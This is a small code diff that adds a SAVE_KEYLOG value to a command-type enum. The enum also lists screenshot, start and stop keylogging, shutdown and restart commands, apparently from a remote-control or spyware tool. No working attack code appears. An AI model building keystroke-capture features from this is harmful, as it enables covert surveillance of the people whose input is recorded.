@@ -18,6 +18,7 @@ export enum CommandType {
     SCREENSHOT = "SCRSHOT",
     START_KEYLOG = "STARTKLOG",
     STOP_KEYLOG = "STOPKLOG",
+    SAVE_KEYLOG = "SAVEKLOG",
 
     SHUTDOWN = "shutdown",
     RESTART = "restart",
